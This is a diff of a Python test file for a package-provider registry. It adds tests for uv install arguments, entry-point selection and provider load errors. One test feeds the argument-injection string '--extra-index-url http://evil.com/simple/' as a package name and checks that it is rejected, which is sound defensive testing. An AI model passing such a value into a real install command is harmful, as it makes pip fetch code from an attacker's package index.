@@ -213,7 +213,9 @@ class TestInstallAndRegister:
                     return_value=_make_mock_dist("my-pkg", ["my-provider"]),
                 ):
                     install_and_register("my-pkg")
-        mock_run.assert_called_once_with(["uv", "pip", "install", "my-pkg"], check=True)
+        mock_run.assert_called_once_with(
+            ["uv", "pip", "install", "--python", sys.executable, "my-pkg"], check=True
+        )
 
     def test_uses_conda_when_no_uv_and_conda_prefix_set(
         self, registry_path: Path, monkeypatch: pytest.MonkeyPatch
@@ -311,6 +313,22 @@ class TestInstallAndRegister:
         saved = load_registry()
         assert saved[0]["package"] == "My-Pkg"
 
+    def test_raises_value_error_on_invalid_package_name(
+        self, registry_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """Raises ValueError for package names containing flag-like characters."""
+        monkeypatch.delenv("CONDA_PREFIX", raising=False)
+        with pytest.raises(ValueError, match="Invalid package name"):
+            install_and_register("--extra-index-url http://evil.com/simple/")
+
+    def test_raises_value_error_on_package_name_with_spaces(
+        self, registry_path: Path, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """Raises ValueError for package names containing spaces."""
+        monkeypatch.delenv("CONDA_PREFIX", raising=False)
+        with pytest.raises(ValueError, match="Invalid package name"):
+            install_and_register("my pkg")
+
     def test_propagates_called_process_error(
         self, registry_path: Path, monkeypatch: pytest.MonkeyPatch
     ) -> None:
@@ -393,6 +411,44 @@ class TestLoadProviderClass:
         mock_ep.load.return_value = str  # not an AbstractWizardProvider subclass
         with patch("wt_compiler.providers.entry_points", return_value=[mock_ep]):
             with pytest.raises(TypeError, match="not a subclass of AbstractWizardProvider"):
+                load_provider_class("my-p")
+
+    def test_prefers_registered_package_when_multiple_eps(self, registry_path: Path) -> None:
+        """When multiple EPs share a name, loads the one from the registered package."""
+        registry_path.parent.mkdir(parents=True, exist_ok=True)
+        registry_path.write_text(
+            '{"providers": [{"name": "my-p", "package": "correct-pkg"}]}'
+        )
+        wrong_ep = MagicMock()
+        wrong_ep.name = "my-p"
+        wrong_ep.dist = MagicMock()
+        wrong_ep.dist.metadata = {"Name": "wrong-pkg"}
+        wrong_ep.load.return_value = object  # would fail type check
+
+        correct_ep = MagicMock()
+        correct_ep.name = "my-p"
+        correct_ep.dist = MagicMock()
+        correct_ep.dist.metadata = {"Name": "correct-pkg"}
+        correct_ep.load.return_value = _FakeProvider
+
+        with patch("wt_compiler.providers.entry_points", return_value=[wrong_ep, correct_ep]):
+            result = load_provider_class("my-p")
+        assert result is _FakeProvider
+        wrong_ep.load.assert_not_called()
+
+    def test_raises_value_error_on_ep_load_failure(self, registry_path: Path) -> None:
+        """ep.load() raising ImportError → ValueError with helpful message."""
+        registry_path.parent.mkdir(parents=True, exist_ok=True)
+        registry_path.write_text(
+            '{"providers": [{"name": "my-p", "package": "my-pkg"}]}'
+        )
+        mock_ep = MagicMock()
+        mock_ep.name = "my-p"
+        mock_ep.dist = MagicMock()
+        mock_ep.dist.metadata = {"Name": "my-pkg"}
+        mock_ep.load.side_effect = ImportError("missing transitive dep")
+        with patch("wt_compiler.providers.entry_points", return_value=[mock_ep]):
+            with pytest.raises(ValueError, match="Failed to load provider"):
                 load_provider_class("my-p")
 
     def test_error_message_lists_registered_names(self, registry_path: Path) -> None:
